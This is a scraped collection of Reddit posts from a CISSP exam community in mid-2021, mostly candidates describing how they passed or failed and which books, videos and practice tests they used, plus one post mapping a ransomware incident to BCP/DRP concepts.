Also I went with the approach of reading the question multiple times and even purposely slowed down on questions I knew the answer.  I don't think this is a good approach considering I literally had seconds left with potentially a LOT of questions left if the exam was to continue.

They are worded differently and make you feel tempted to click the wrong answer, be sure to read the question multiple times. There were questions where i purely guessed the answer as I never read those topics in my life. I was mentally exhausted and was preparing for the worst and after 100 question the test stopped.  I went to the front and received the result and to my surprise i passed, i couldn't hold my excitement and shouted a big YEESSSSSSSS.

Second - I'm an idiot, I don't learn fast, and this shit was hard to study for. If you are reading this you are smarter than I am - you will pass this.

The exam was brutal. 20 questions in and I'm already mentally preparing to fail. The test stopped at 100Q and I would have bet $100 it was because I couldn't mathematically pass with more Qs. I shit bricks when I saw the Congrats. So here my biggest takeaways -

I used very few resources

\- the 2018 official guide and matching practice exam book(has 1000+ Q's, get this!),

\-the Syngress 3rd edition study guide and the Syngress 11th hr book (same authors)

\- Boson practice tests.

\-Thats it.  No new material studied for the updated exam - not needed!

Here's what I did

\- read every book, cover to cover, and highlighted the important concepts /facts.  If any of the material puts information in an outlined box - that's not extra info, its stuff you REALLY need to know.

\-Practice tests. Do as many as you can, find your weak domains, go back to the books and skim through your highlights, and take more tests.  Do NOT memorize the answers to your practice test, I promise this is a sure way to fail.

&#x200B;

* Key to passing- Answer your practice question correctly, then explain to yourself \*why\* the question was correct.  I didn't come across a single question on the real exam that resembled anything close to the 2000+ practice questions I took, but understanding why you chose the practice question answer is the secret sauce.  Add Kelly Henderson video ""Why you will pass"" and you can shit bricks when you see ""Congratulations"" on your test results too.",2021-07-11

775,oh9f9h,"Passed at 100 questions, ~2 weeks of study, 7 years IS experience","
Got sort of voluntold to get this by EOY about a month ago. Did the Training Camp bootcamp (I do not recommended, more below) last week as I had a “free” week between engagements. Hadn’t done anything at all prior to that week. Exam was not yet scheduled at the start of bootcamp. A couple days into the class one opened up for today, so I grabbed it. 
I’ll just say that the timing with this PrintNightmare… nightmare could not have been worse.

I did the bootcamp (Monday-Saturday morning).
Did nothing on Sunday.
Did a few practice tests Monday (holiday)
Tuesday actually got some real studying with notes and everything!
Wednesday all hell broke loose with the PrintNightmare patch and that sort of took over the rest of the week for me. My study time turned into very short (10-15 question) practice tests when I could grab a few minutes during the workday, then did the real ones (100-150) after hours. 
Exam was this afternoon, Friday, and I can’t wait to actually sleep tonight. 

I passed at 100 questions and I have no idea what the time was.
I was just as surprised how confident I was with many of the questions as I was with how many I stared at and second guessed for probably far too long. 

Study materials:
- Training Camp Bootcamp - I chose the virtual classroom option, not knowing that it was actually a hybrid class and I’d basically just be sitting on mute watching a live class with no real interaction. The instructor I had elected not to use the ISC2 training materials provided his own stuff, which he had not yet updated for the new CBK. There were some other issues, but those was the main ones. 
- CISSPrep - I literally got an account last night after seeing someone on here mention that their practice tests are hard. I wish I’d known about that sooner, probably would have passed on Training Camp, or any live training, entirely. 

Practice exams:
- CISSPrep - I found these to be the best. They’re hard, and it can be discouraging to do poorly. I found that the questions forced me to think the right way. Feedback on missed questions is both great and can be incredibly frustrating because if you miss a “not tricky” one it forces you to go look it up yourself and you actually LEARN.
- Sybex (latest version of the book, online question bank, and the app) - these were ok. The online bank and the app didn’t sync well, so I kept getting repeat questions despite toggling that setting off. It could stand to give better feedback on missed questions. 
- PocketPrep - Found it useful for short quizzes. Probably could have gone without this one but that’s ok. I liked being able to see the user average.
- CCCure - This was way more frustrating than it was helpful. I guess they let others contribute to their test bank to have it be like the real question pool where you’ll encounter questions written in different ways, but after awhile you start to be able to pick out questions by author, especially the bad ones, and there are bad ones. And with that comes a lot of inconsistency in answer explanation. Definitely could have gone without this one, and it was the most expensive by more than double. It was also recommended by the TC instructor but that’s neither here nor there.

777,oh6yuf,Mapping the chapters to the domains,"Hi team,

I am not sure if this question was asked before but
Is there a way to map the 20 chapters of the official study guide to the 8 domains of the CISSP exam?

I m trying to finish one domain video of Mike's LinkedIn course each day and then do all that domain's questions..

It is easy when dealing with official practice tests(they are divided into 8 domains) but it's a different case when dealing with the official guide questions (they are about a 1000 questions divided into 20 chapters)",2021-07-10
778,oh3qjj,"Pass @ 100 Questions - 2 weeks of study, 10 years of IS experience (4yrs as CISO)","**And if you're newer to the industry: Even as a CISO, I didn't know a lot of this. So good on you if you can pass on the first attempt!**

About 5 years ago I was planning on getting my CISSP, but I got a promotion to a CISO and never felt the need to get it. Fast forward to remote work culture (and a few kids later) and now I'm re-evaluating where I want to be in the future (hint: It's less management and more technical problem solving).

I found this board and noted a few things. One that stood out was the PocketPrep resource. I took a few free practice exams to gauge where I was. Initial tests showed that I was averaging about 60%. I figured with a bit of hard-core ADHD studying, I could get it done. I bought the 8th edition of Shon and read that from cover-to-cover (highlighting all the important pieces) over the course of a week (coffee break? Grab the book. Bathroom break? Grab the book. Every meal? Grab the book).  I subscribed to PocketPrep and after reviewing Shon, I took a few exams. Where I was coming up short, I went back and refreshed on those domains. After burning through the rest of the PocketPrep question bank (with about 3 days to go), I found a question bank from Cybrary/Kaplan ([https://app.cybrary.it/immersive/enrollment/activity/27008376](https://app.cybrary.it/immersive/enrollment/activity/27008376)) and used their bank. After going through those questions, I realized that Shon was a little light in certain areas (despite the fact that it's 1300 pages). If I had more time, I probably would have acquired their referenced source as Shon does did not even reference some of the items found in the Kaplan questions ([https://www.amazon.com/CISSP-Cert-Guide-3rd-Certification/dp/0789759691](https://www.amazon.com/CISSP-Cert-Guide-3rd-Certification/dp/0789759691)).

Overall the exam included a lot of ""BEST"" or ""MOST"" answers and as a professional who lives in grey waters, I could constantly hear myself say ""It depends"", but context seemed to always be lacking. I honestly still don't know what the right answer was for most of them as often times it felt as though all 4 were correct, it just depended on your definition of ""BEST"".

At 100 questions/90 minutes I got kicked out. Since I was already borderline when I first took some practice questions, I took that as a good sign.

My job experience:  
4 years CISO (Definitely helped as I've dealt with a lot of this information from OJT and never heard of a lot of it when I was in my engineering roles)  
5 years in Analyst/Engineer Roles  
10 years of various IT/Sysadmin positions  


If you've been in the industry for a while, these questions still suck, but just buckle down for a few weeks-month and press through it. You got this!

And if you're newer to the industry, even as a CISO, I didn't know a lot of this. So good on you if you can pass on the first attempt!",2021-07-09

781,ogv3ld,Passed at 150 Questions and 3 Hours,"Took the exam and passed at 150 questions. I was pleasantly surprised and to be honest I did not expect to read Congratulations on the sheet after I left the testing center. 

One of the weirdest elements of my exam was that it almost felt like the exam was trying to get me to pass. As I passed question 100 I received many questions on concepts that I was most strong in. It really did start to mess with my head because I just assumed that the exam was just feeding me questions to get to 150 as I couldn’t understand how I got the same question on SOC reporting rephrased 5 different ways. 

Studying consisted of:

- Training Camp Boot Camp
- CISSP Exam Cram Youtube Videos
- Study Notes and Theory Test Questions (~200)
- Sybex Test Questions (~300)
- Luke Ahmeds How to Think Like a Manager for the CISSP

Overall i’d say the Exam Cram videos were the best to jog my memory on all the concepts leading up to the Exam. I don’t think I took the conventional study method as I took the Training Camp bootcamp and sat for the exam a few weeks later. I’ll be honest that my exam prep wasn’t the greatest as I only had limited nights and weekends to dedicate. But the week leading up I had 2 full day cram sessions (the day before and the day of the exam).

784,ogfy0o,Passed the CISSP exam last week. Here's how I studied.,"I'll start with a big thank you to everyone that has posted what worked or didn't for them while studying. I gained a lot of insight browsing through numerous posts. I don't have any incredible insights, but below is what I used to pass the exam and hopefully someone can get some use out of it.

Almost all of the sources I used are available for free via O’Reilly/Safari Online if you have a DoD email.

 

Video Courses:

- Cybrary CISSP Video Course [Free]- Kelly Handerhan (15 hours) 
This course does a tremendous job of highlighting all of the major topics in each domain. Provides examples that make concepts relatable and easy to digest.


- CISSP Certification Video Boot Camp [Free w/O'Reilly account] – Thor Pederson (24.5 hours)
Provides a lot of practical examples. Examples are framed in a way that aligns to the “CISSP mindset.”


- CISSP Cert Prep [Free trial via LinkedIn Learning] – Mike Chapple (24 hours)
This was the only source updated for the new version of the exam released in May that I used. This series does a good job covering Domain 3 compared to the other sources.

- CISSP Complete Video Course, Second Edition [Free] – Sari Greene (26 hours)
This course is more formal and in-depth, heavily focuses on practical application of topics (some are not relevant to the exam).

- Mind Map [Free] – YouTube (6.5 hours)
Short and well-produced. They do a good job of summarizing topics within each domain and provide an organized view of the material. It’s a good source for a quick overview of each Domain or as a last minute review.



Text Materials:

- Eleventh Hour CISSP Study Guide [Free with O'Reilly]
Good for an overall introduction to CISSP topics. Some of the topics are dated, so keep that in mind if you use this for review.
 
- (ISC)2 CISSP Certified Information Systems Security Professional Official Study Guide 8th Edition [$40]

- “Sunflower” CISSP Summary Version 2.0 [Free]
Wasn't a fan of this, but I did use it as a final review.
 

Practice Exams:

-(ISC)2 CISSP Official Study Guide, 8e [Free if you buy the book]

- CISSP Official (ISC)2 Practice Tests [Free with O'Reilly account]


Misc:

- Why you WILL pass the CISSP – Kelly Handerhan via YouTube
Great job of covering the mindset you need to pass the exam.

- Essential CISSP Exam Guide: 2018 CBK [$14.99] – Audible (17 hours)
The audio quality is not the best, but I found this to be useful when I didn’t have time to sit down and study.

 

My Study Schedule:

I studied over a 3 month period. The first month was largely spent easing into an overview of each domain and trying to establish foundational knowledge to build upon later. During the first month I totaled 62 hours of study, a little over 2 hours per day. The second month was focused on diving deeper into the material, powering through multiple video courses, and taking a couple practice exams to determine where I stood. During the second month I increased my total study hours for the month to 82, averaging approx. 2 hours and 40 minutes per day. I spent the final month reading the official study guide and taking practice exams (I answered approx. 1,500 questions during this period). Overall, I spent 110 hours studying in this final month, averaging a little over 4 hours per day. I increased my study efforts during the final week before the exam, studying 36 hours during the final 7 days. All of this time was spent reviewing and not trying to learn new material.

 

Recap:

Month 1: 62 hours (2 hrs/day) - Intro to each domain
Month 2: 82 hours (2.5 hrs/day) - Deep dives
Month 3: 110 hours (4 hrs/day) - Practice Exams and reviews
 

Final Thoughts:

1. Develop a plan early and stick to it. Use some of the shorter study items to identify your strong and weak domains. Build your study plan around these results.

2. Don’t try to become an expert in your weak domains. Put in the time to become proficient, but don’t ignore the other domains.

3. Learn the logical processes as opposed to memorizing exact steps. Understand how everything fits together instead of memorizing definitions.

4. Remember to approach the test with the appropriate mindset.

5. Practice tests are important to identify knowledge gaps, but don’t try to memorize the answers. Read the explanations and try to understand why each answer is the correct choice.

6. Take a few breaks from studying where you don’t review any CISSP material for a day or two. Especially the day before the exam.

 

TLDR: There is a lot of free material available to those with a DoD email account. Set a goal and stick to it. Take some breaks and find time to relax and have some fun. Spend time reviewing questions on the exam and approach the test with the appropriate mindset. When you get close to your exam date, trust that you've done enough to prepare yourself and take a break the day before. Best of luck!",2021-07-08

My local community college doesn't offer any classes purely focused on the CISSP unfortunately. I already checked there.

I think the bootcamps only benefit me when I've done all the studying I can and it's a cram session before taking the test.

793,of9geh,Fujifilm Ransomware BCP/DRP CISSP Correlation,"Greetings, I wish everyone good luck on their CISSP exam this week.  With all the ransomware news, I was especially impressed with the way Fujifilm handled their ransomware incident.  They didn't pay the ransom and recovered operations from backup.  Just thought I'd share some notes of what I thought Fujifilm's BCP/DRP process may have looked like if it helps to correlate the real-life event to your CISSP studies.  Everything below is hypothetical and just used as an example to apply CISSP concepts to real life.  These are just guesses.  

BCP/DRP Process (General) Steps

  **Step 1** **is defining a policy, narrowing down the scope, and beginning the initiation of the BCP/DRP**

*  For Fujifilm, their senior management probably did have a clear policy and scope defined.  
* We can tell they had a policy and scope because when the article I was reading on the publication “Verdict”, asked the company if they had sufficient backups, their response was “Fujifilm does have **backups** in place as a part of its **normal operations procedure** aligned with its **policy**”.
* If Fujifilm had a policy about normal operations procedures after a disaster, it means they definitely had a policy to have a BCP/DRP plan in the first place, because as we know, nothing gets done in a company without first having a policy from senior management.
* Because Fujifilm had a policy to have a BCP/DRP plan in the first place, it attributed to their successful recovery of operations. 
* Otherwise, if there was no policy or a BCP/DRP plan, things would not have gone as smoothly.
* During the ransomware attack nobody would know what to do, what direction to go, how to handle the situation…nothing.  It takes a policy from management to create the BCP/DRP plan, which will provide the pathway to how to handle a disaster.  

  **Step 2 Business Impact Analysis - Define the critical business functions and resources**

* Fujifilm's Chief of Operations could state that if the data on those servers were being held for ransom, the business would come to a standstill, and the data would be needed back in order to continue operations. 
* The Director of Network Operations could say that if their Content Delivery Network solution were to stop working, that would stop the organization’s e-commerce business process, and would result in a heavy loss of revenue.  
* Both provided a technical issue, but also stated how it would affect the overall revenue-generating process of the company (both technical and high-level reasons)

  **Step 3** **- Contingency Strategies (Decide the most cost-effective and reasonable recovery strategy)**

* According to FIPS 199 an impact level of ""High"" would mean any damage or disruption to assets with this rating could halt everything in the business, the organization, the objectives, the networks, systems, applications
* Suggested backup is real-time replication of data as well as WAN/VLAN replication
* Suggested recovery strategy is a hot site

  **Step 4 - Testing and Maintenance** 

* Out of all the tests, maybe they most likely did a parallel test
* Businesses are hesitant about a full-interruption test as it means to stop the business
* If it was a structured walkthrough then individuals who head their own respective departments come together and discuss responsibilities
* If they did a simulation test, they would have all their BCP coordinators, BCP team, network engineers or their bosses, or other operational and mid-level management there to participate.  
   * Meaning, it’s just a simulation, but you have to act like it's happening.  Fujifilm probably checked to make sure their backups were processing, and ran through some things to see if the backups could be retrieved, without actually fully recovering them.  
   * They just simulated not only the disaster, but also the response, nothing “actually” was done like in a parallel test.  
* And of course, as with all CISSP processes, make sure there is documentation  
* Also updating the BCP/DRP document in case of any of these changes: 
   * Major changes to the company’s network or system architecture 
   * Changes to senior management
   * The addition or removal of certain technology
* Documentation and updating changes to the BCP/DRP document is all part of ""maintenance""

I thought it was neat how Fujifilm didn't pay the ransom and initiated a successful BCP/DRP.

Have a solid week ahead.",2021-07-07
794,of0f0r,Passed today. Everything they say is true...,"I passed today with 100 questions in about 80 minutes. All of my questions were from left field. It's like the test writers said ""okay, you read the Sybex Guide? Good, so you know the terminology. But since you have 5+ years of security experience, you should know how to solve this hypothetical problem that's tangentially based on the this risk management principle..."" 

It's like it doesn't test you on your knowledge of the material, but rather on your ability to internalize a and articulate the principles in scenarios you've never contemplated. 

Or what's more -- it's like you're going to an oracle and telling her you're worthy of CISSP. You act like you're worthy, but the whole time, deep down, you question if you're really worthy (i.e. you expect to see FAIL at the end). In then end the oracle is never wrong. Now I just have to wait until my psychometric evaluation is complete to see if I can get past my provisional pass. Hopefully I'm worthy. 

Study materials (in no order):

1) Sybex book

2) Mike Chapple LinkedIn Learning (All Domains)

3) Thor Teaches (Domain 1 and 2)

4) Wiley Sybex App quizzes

5) Self-paced Online course from uCertify (paid for by my employer). This has quizzes and labs. 

It's hard to say which one was the best. But the uCertify course was long and I has to finish it all to get a test voucher, so it certainly had the biggest impact on me.

I'm five days out from exam time and the panic is starting to set in. I have five years experience in a non-technical role within InfoSec. No technical background whatsoever. 

I've been studying off and on for a little over a year, four consecutive months of intense study, and have been utilizing the usual suspects: Shon Harris AIO, 11th Hour, IC2 OSG, Destination Certification MindMaps, Boson, PocketPrep, handwritten notes, flashcards and all of Kelly's videos on Cybrary. I've also taken a 10-week  bootcamp class three times (seems excessive now that I'm writing that out!). The OSG was a last minute add but it's been helpful to switch things up a bit; I'd found I was getting too used to Boson's question formatting. 

I'm scoring 75-80% in Boson and the OSG test banks. Around the same in PocketPrep. I've answered thousands of practice questions and made thousands of flashcards. This week I'm trying not to panic-cram but instead focus on really honing in on the BCP, DRP, SDLC and incident response phases/processes. Also Kerberos because those terms are tricky AF. Domain 4 will always be my weakest domain since I had no idea what a packet was and had never heard of the OSI model before starting to study for the CISSP (true story). While I know the basics, I've resigned to the fact I'll never remember what every single protocol does. I'm hoping that my lack of technical background will help me think less like a problem-solver and more like a manager since that's really all I know. 

I've scheduled (and rescheduled) the exam 3 times but this time I'm going for it. My brain is cooked; even if I had another month before the exam, I don't know that I could retain anything additional. Anything you'd recommend for the last couple days before the exam (besides more panic)?",2021-07-06

798,oene2u,How to pass CISSP with limited budget,"Hi I provisionally passed at 100Q (30 minutes before time) on my 1st attempt. I prepared a long time since if I fail I couldn't retake it for at least a year because its too expensive (I saved money for this exam for almost two years and borrowed money from payday loans for some of the study materials) so failure wasnt an option.

My background:  
Im from a 3rd world country (Poland), Im working as a senior cybersecurity consultant for 6 years. Before that, I've been a Java/Scala developer for 8 years but I decided to go for cybersecurity since there are way too many software developers in my country and the wages were getting lower and lower due to high supply.  I was also always very interested in cybersecurity issues. Besides that, Im programming since I was about 13 and created several open source projects.

Materials used:  
\- All in One Exam Guide 8th edition - this was my primary resource for about 5 months since it was given to me (along with OSG and Think Like a Manager Book) by my colleague who also tried to take CISSP but he given up. I read the entire book very carefully but didnt take much notes. I scored about 80% in the tests. It was very boring and given too much details (history etc), I liked the OSG dry style much better;  
\- OSG 8th edition + practice tests - another resource given to me, I read chapters about domains 1, 3 and 5 since they were relatively unchanged compared to new 2021 exam (according to Mike Chapple comments) for about one month; this time I did many notes; in tests I scored about 85-90%;  
\- How To Think Like A Manager for the CISSP Exam - tiny book so I read it very quickly, pretty good resource;  
\- Mike Chapple videos on Linkedin - FREE for first month and updated for 2021 material so I watched them all during that first free month and did a lot of notes. Mike Chapple said that combining his videos with 8th edition OSG should be enough to prepare for 2021 exam;  
\- Official ISC2 flash cards - FREE, good to learn some definitions, minor mistakes;  
\- OSG 9th edition - one of two resources I bought, read chapters about domains 2, 4, 6, 7, 8 which changed most using speed reading (I got the book about 2 weeks before the exam). Vitalsource Bookshelf app is crap but I've had to use it since my account on amazon was blocked due to failed payments. Registered on Wiley  online learning and took all the tests, scored about 85-90 so same as for OSG 8th - questions vere much easier than those on the exam;  
\- CISSP Mindset Academy - scored 64% on both; few major errors but decent explanations for questions, questions vere more similar to those on the exam;  
\- [CISSPREP.net](https://CISSPREP.net) \- did only the free initial test and scored 80% (15 out of 19), couldnt use full version due to high cost (25$ - beyond my budget);  
\- Watched several youtube videos including Why you will pass the CISSP and How to Pass the 2018 CISSP exam: A Sure Fire Method to Help You Ace the Exam. Tried to watch also Destination Certification videos but I learned about this resource late in the study so I prefered my own already made mind maps to theirs;

Materials did not used:  
\- BOSON - I wanted to give it a try but it was way beyond my budget even with 25% discount and also not updated for 2021 so I decided to pass and use wiley as my primary test bank;  
\- Thor Teaches - ultra expensive also.

The exam:  
\- The questions were rather hard, some of them covered subjects I did not encounter before so I used elimination and reasoning technoques. I read questions and answers very slowly so at question 100 I was left with only 30min - if the test would keep going to question 150 I would be in a big trouble but thankfully it didnt.  
Im not a reddit user but reading this reddit helped me much with my preparations so I decided to share my experience :)",2021-07-06

Good day!


Well not so good for me as I failed the exam after answering 150 questions in 1 hr and 45 mins.


I was thrown with a lot of questions in a certain topic in which I didn't dive that deep. When I checked the OSG, that topic is just discussed in one page and showed additonal links for further reading.


I tried to apply the ""Risk Advisor"" mindset during the exam. I would say I used it properly as I was able to determine which is the correct ""Managerial"" answer from the correct ""Technical"" answer which is focused on fixing things.


For my study plan, I've used OSG, Cybrary, Boson, CISSPrep, and Rob's MindMap for like over 6 months of studying.


I have 7 years of experience under my belt in IT (Telco, NW, Security Engineering) and currently working as InfoSec Consultant.


I am now thinking whether should I retake the exam. If so, I am considering to take it after 6 months or even couple of years. I think this exam is easier for folks who are more seasoned in the industry.


For those who are studying for the exam, don't stress yourself too much. Remember to take a break during your studies as this exam will surely bring a study fatigue.

818,ob3mpw,Provisionally Passed 21 June 2021!!!,"150 questions in about 2 hours.  I made my first attempt about 4 years ago. On February 2021 I decided to give it another try. I booked the test to make sure I had a deadline. I studied a lot during my free time. I never felt prepared for this beast. I made sure that I truly understood the material and wasn’t just memorizing things. This helped me A LOT during the exam. I felt confident in maybe three of my answers. I read the question several times, read the answers, then read the question again. English is not my first language and I sometimes have a hard time figuring out what they are asking. I honestly thought I had failed. I didn’t look at the paper until I was outside the building. I almost cried when I read “Congratulations….” on the paper. I am honestly still in disbelief that I passed but I feel like a massive weight has been lifted. 

Study Materials:

I started with Kelly Handerhan’s CISSP Cybrary.it videos. They are amazing! She helped me focus my studies. 

Used OSG 8th edition as a reference book. I did read the end of chapter summaries. 

Rob Witcher’s Mindmap videos on YouTube were AMAZING!!!! 

I read the 11th Hour a week before my exam date to refresh my mind.

I did a lot of practice tests on the Wiley test engine that you can gain access with the OSG book. 

Thanks to this REDDIT community, I found CISSPREP.net. The questions were HARD but they helped me a lot. I have to agree that the way they ask the questions is probably the closest to the format of the exam. 

IT & Security App- I took quizzes whenever I was sitting around. 

I truly want to thank this community. I would find encouragement from everyone's posts, pass or fail.

821,oakjg4,Provisionally passed @ 107Q in ~130 minutes,"This was the 9th time I have sat for a certification exam in my IT career and I probably studied three times more than I did for any of the other ones - MCSE, A+, Security+. I have around 25 years of experience in the field, most of that as a network admin on Active Directory/Azure. But I've also worked the helpdesk, been Tier 2 and Tier 3 support, and even spent a year as a Logistics Manager, which I was surprised to find got me a lot of experience with the physical security concepts that were on the exam. 

I had actually planned to get my CISSP in 2020, back to back with getting my Security+, but two things happened right when I was about a month or so out from being ready for the exam, I got a new job, and then there was a global pandemic that shut all the testing centers down, so getting the CISSP went up on the shelf, but I did do about 4 hours of training a month on it, which is nowhere near enough but it kept me in the mindset.

Anyhow I got laid off this spring so I decided to go ahead and wrap up the CISSP certification while I have a lot of time to study for it. One thing that really got me into high gear was to go ahead and schedule the exam, once that clock is ticking down, even if it's weeks away, it will keep you motivated! I did find that it was hard to get available spots 1-2 months out for the exam, but if you keep checking the available spots you find that many candidates reschedule their exam when they're about 2-3 weeks out. So when I felt like I was about 3 weeks away from being able to do it I pulled the trigger on the 29th.

Study materials:

* **Original Study Guide (8th ed.) and Original Practice Tests** \- I got the bundle off of Amazon last year when I started studying the first time. I did wind up reading the OSG cover to cover in 5 days but it was towards the end of my studies. It's a tough read but I pushed my way through, and now I think that doing this was critical to understanding the material for the exam. It tied up a lot of small loose ends that I had been struggling on. I strongly suggest reading all of it at least once.  As for the OPTs I registered those online through Wiley Efficient Learning, and downloaded the ios app so I could take the tests on my PC and on my iPhone. I will say the web based version is kind of clunky and I wound up needing to login two or three times to get it to work but it was fine once I got logged in. The ios version seems to be better. The nice thing is that both the web version and the ios version share your results so you can check your progress from either platform.  One thing I didn't realize until late in the game was that if you register the OSG online as well it gives you a completely different test bank of 1300 questions, so be sure to register both products if you get the bundle!
* **Boson CISSP Practice Exam** \- I actually bought this last year as well but I had only taken the first of the five practice exams in it. Yes it's quite technical but just like the question banks from the OSG and OPT, it's testing you on the knowledge base you'll need to pass the real exam. No, the questions aren't like what you'll get on the exam but you must have a complete understanding of all 8 domains and that's what this product is testing you on. The explanations are excellent and will point out where you need to study more. Also at the end of the test it will show you what domains you may be weak on. 
* **My strategy for taking practice tests** \- I'd like to point this out because I think it's important - the CISSP exam is not like other technical certifications you may have done before. Taking practice exams over and over again until you've memorized all the questions and answers is not going to work. My study strategy for the practice tests evolved over time but the way I decided to do it was that instead of taking the same practice exams over and over again I would take them once, then go back and re-take all the questions I answered incorrectly. If I could answer one of the questions correctly then I was done with it and closed those questions out. Fortunately both Boson and Wiley Efficient Learning let you select only the questions you've answered incorrectly for creating custom quizzes so that's where I focused my studies. I did wind up taking the Boson tests twice, about three weeks apart, but out of the 10 practice tests on Wiley Efficient Learning I only took those once. 
* **MFProd on YouTube** \- I did these as part of my study last year before the pandemic hit. If I remember right it was more than 40 hours of material, and was very comprehensive. Unfortunately last year there was some kind of copyright issue with these and they were taken down. A shame, because I made my own ""boot camp"" out of it and took pages and pages of notes which I was referring to as recently as last night.
* **CISSP Cert Prep (2021) on Linkedin Learning** \- since MFProd was gone I needed to use something else, and I had used Mike Chapple's Security+ course on Linkedin to pass that exam so this was the first place I went. Fortunately I discovered that I could get access to LinkedIn Learning for free with my local library card! So I signed up for a library card and then got access to the LIL site. It's more or less the video version of the OSG so it's a bit dry and was kind of a grind but I watched all of it and got myself back up to speed.
* **Kelly Handerhan videos on Cybary** \- everyone talks about watching these and there's a good reason why - Kelly is uniquely skilled in explaining some of the harder to understand concepts you'll need to understand for the exam. After watching this I had Kerberos down solid. It's not like the LinkedIn Learning course in that it's much shorter and not as comprehensive so this is something you should watch towards the tail end of your studies, I was most of the way through this when I scheduled my exam time 3 weeks away.
* **CISSP MindMaps on YouTube** \- these are pretty good, when I was weak on a domain in the practice tests I would go back and watch the MindMap videos for the domain I needed to brush up on. 
* [**CISSPrep.net**](https://CISSPrep.net) **practice exams** \- this was the first of the HARD practice tests that I purchased. Some of the questions are a little rough around the edges but they're quite difficult and they have a LOT of practice tests. The exams are only 50 questions but they're hard, and it will take you a while to get through them. I only did about 5 of these in the end but the explanations are good and once I was done with Boson and WEL, these got me ready for what the real exam would be like.
* **CISSP Mindset Academy practice exams** \- these are also HARD questions and they've been updated for the new material on the 2021 exam. I took both exams just last week and was only able to score in the 50% range on them, that was a bit worrying to me until I found out that's a completely normal score for someone who is about ready for the exam. Once again, I would do these after you've already completed Boson and WEL- these get you ready for the real thing. These tests and the next one are both on Udemy. 
* **HARD CISSP practice questions #1 Thor Pedersen** \- for me this wound up being the final go/no-go for sitting the real exam. I decided that if I was under 50% the first time I took it I was not ready and would have to re-schedule the exam. I scored 55% when I took it last Sunday. I decided I was ready to go. Thor is the guy who says you should do 5000 practice questions before going for the exam, and I tend to agree with this. I'm not sure if I did 5000 questions but I'm pretty sure I was over 4000.
* **Eleventh Hour CISSP Study Guide** \- I got the audiobook version of this and listened to it all the way through on the very last day at 1.3x. Finished it right before I went to sleep on the last night before the exam.
* **Why You WILL Pass the CISSP Kelly Handerhan, Larry Greenblatt CISSP 2020 Exam Tips, The CISSP Mindset: How to ""Think like a Manager"" and PASS!**  \- watched these three videos right towards the end. Heck, the last one I watched in the parking lot of the testing center. These put you in the right manager/advisor mindset to take the real exam. Want to know why a lot of people fail the exam on the first try? They didn't have the manager/advisor mindset going into the exam, that's why.

So as others will tell you the questions you get on the practice exams aren't like what you'll see on the real exam and this is quite true, especially for the WEL and Boson stuff. The hard exams I listed are closer to the real thing though. 

Like everyone tells you, I wasn't sure if I had passed or not when the test ended. When I got to question 101 I knew it was really serious at that point, and by then time management was becoming an issue. Definitely read every question on the exam more than once! There were a couple of times when I looked at the answers and thought ""all of these are right answers"" and then I would find a single word in the question that made only of the answers the correct one. Those were the ""A-HA! GOT YOU!"" moments. (imagine the gif with Leonardo DiCaprio pointing at a tv screen here). There were also a couple of ""What the heck are they even trying to ask me?"" moments. I gasped when the test suddenly ended at question 107 and wasn't 100% certain how I had done until I opened the printout the lady at the front desk handed to me. I actually had to check that exam sheet a couple of times just to be absolutely certain I hadn't hallucinated the words ""Congratulations!"" and ""you have provisionally passed"".

By the way both this subreddit and the Certification Station discord server were critical in getting me that passing score. I was checking posts in here every single day and hanging out in the # cissp room on the discord server.

I would watch Chapple's videos, do some practice questions after the domain, and then watch the mind map video and then do some more practice questions. 
* Why you will pass the CISSP youtube video by Kelly Handerhan - this is a quick one and I watched it at the parking lot of the testing center, as a final pep talk before heading in.  

What didn't work:

* 11th Hour - so general I fell asleep
* [cisspprep.net](https://cisspprep.net) \- I picked it up on here and some of the reviews were great so I gave it a try... the website is somewhat confusing and while I got some good tips I felt like I was mostly looking to understand the author's intent in the question and what they wanted me to select than the actual info that's relevant for the exam

About me:

I have over 15 years of IT experience. I've been on the engineering side, the IT side, and now I work for a security vendor and talk security to CISO/CIO, architects, engineers and a LOT of the material for the exam was driving me nuts because it was just wrong. I knew what was expected of me to answer and so I did just that while grinding my teeth.

Once again, thank you all for all the good tips!

823,oa7l7s,Is there any hope for someone like me?,"I’ve been in IT for a total of about 5 years. One year in Help Desk, three years in Desktop Support, and about one year in my current SysAdmin role. I have my Network+ and Security+ right now and really want to break into the InfoSec side of things. Every job posting says that CISSP is either preferred or required so I’ve been looking into it and took a couple of pre-assessment tests and made 70’s on both of them. The task still feels daunting because I’ll see people post here with 10-20 years of IT and InfoSec experience and *still* feel like the test was difficult. Is there any hope in me passing CISSP at my current level, if not what would be a valuable next step to try and get into this side of IT? 

Thanks everybody.",2021-06-29
824,oa79co,Provisionally passed 21 June 2021,"I have followed this subreddit for a long time and wanted to contribute.  I provisionally passed on 21 June on my first attempt.  The test stopped at 137 questions with about 40 minutes remaining.  Like many others have posted, I did not feel ready.  

My study materials were:
1) The Official Study guide:  I read it cover to cover before using any other materials. Dry reading but it was a goal to get through it. 
2) Mindmap videos: These were an excellent resource.
3) Boson Practice exams:  Good resource for gaining insight on areas to focus and follow up on.
4) Thor Pederson on Udemy:  I got through the first 6 domains and then just used the practice exams.
5) Kelly Handerhan:  Listened to her course while driving and doing other tasks.  Also, Why you will pass the CISSP was key for getting the mindset right to take the test. 
6) 11th Hour study guide:  Good resource for a refresher during the last week of my study plan.
7) Various other reading materials such as Memory Palace, Sunflower guide and various NIST documents. 

I am glad it is over, and the endorsement process can begin.",2021-06-29
825,oa36sd,Provisionally passed 29th June 2021,"I had provisionally passed the CISSP exam this morning. It ended at 100 questions around 135 mins mark. 

I scheduled the exam date in April just before the price hike, and I almost exclusively only used Luke Ahmed's Study Notes and Theory practice tests to prepare during the past 2 months.

I had practiced with questions A until 1A one time each, and only used 1 set of practice exam from Boson to check if I was able to complete 150 questions within 3 hours. Overall I think I had reviewed around 1000 questions.

My average score varies between 60+ to 70+, but after taking Luke's hard questions, the real exam questions feel simpler, but not easy by any means.

Though I didn't read any prep books besides reviewing the practice tests, I do have 10+ years of experience in the field which I relied upon heavily. Using similar strategy, I had passed CISM exam in March this year after 2 weeks practising the QAE.

On the last day before the exam, I had also watched some of the Destination Certification CISSP videos on Youtube and I found them to be very helpful in solidifying the concepts. I wish I had watched all of them earlier!

I didn't follow any strict study plans, just practiced the questions whenever I can; on the bus, after work while listening to the news, while tending to the baby crying, while accompanying my wife watching Netflix, and even during toilet time lol! I'm fortunate that my wife is very understanding to tolerate my 3AM sleep schedules.

